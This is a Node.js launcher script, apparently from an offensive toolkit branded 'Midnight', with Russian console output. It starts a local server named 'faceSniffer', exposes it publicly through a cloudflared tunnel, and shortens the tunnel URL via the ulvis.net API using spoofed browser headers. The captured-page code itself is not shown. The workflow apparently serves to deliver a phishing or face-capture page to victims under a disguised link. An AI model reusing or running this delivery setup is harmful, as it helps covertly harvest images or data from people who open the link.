import fs from 'fs';
import { spawn } from 'child_process';
import gradient from 'gradient-string';
import readline from 'readline';
import { bin, install, tunnel } from "cloudflared";
import axios from 'axios';

const HOST = 'localhost';
const PORT = '8080';

const consoleColors = {
    blue: ['#199cff', '#0600ba'],
    green: ['#00ffee', '#00ff62'],
    nitral: ['#c4e6ff', '#b3b1b1'],
    red: ['#cf0808', '#630000'],
    rainbow: ['#ff1f1f', '#ff9e1f', '#ffff1f', '#5ffa16', '#16fa5f', '#16fadc', '#16b9fa', '#1666fa', '#1a16fa', '#8116fa', '#d016fa', '#fa16cc']
};


const customLink = async (url) => {
    try {
        const response = await axios.post('https://ulvis.net/API/write/post', new URLSearchParams({
          url: url,
          custom: '',
          password: '',
          uses: '',
          expire: '',
          is_private: 'false',
          via: 'web'
        }), {
          headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://ulvis.net',
            'Referer': 'https://ulvis.net/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
          },
          withCredentials: true
        });
    
        if (response.data.success) {
          return response.data.data.url;
        } else {
        }
      } catch (error) {}
    }


const installCloudflaredServer = async () => {
    if (!fs.existsSync(bin)) {
        await install(bin);
    }
    const { url } = tunnel({ "--url": `${HOST}:${PORT}` });

    console.log(gradient(consoleColors.green).multiline(`Линк #1: ${await url}`));
    console.log(gradient(consoleColors.green).multiline(`Линк #2: ${await customLink(await url)}`));

}

export const installCloudflared = async () => {
    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(gradient(consoleColors.rainbow).multiline("\n     __  __ _    _      _      _   _   \n    |  \\/  (_)__| |_ _ (_)__ _| |_| |_\n    | |\\/| | / _` | ' \\| / _` | ' \\  _|\n    |_|  |_|_\\__,_|_||_|_\\__, |_||_\\__|\n                         |___/         \n     © EHD BY VARUJAN\n     VERSION 1.0.0\n\n     Запуск сервера cloudflared\n"));

    console.log(gradient(consoleColors.green).multiline('Запуск сервера faceSniffer...'));
    spawn('npm', ['start', '--silent'], { cwd: './faceSniffer', stdio: 'inherit', shell: true });
    installCloudflaredServer();
};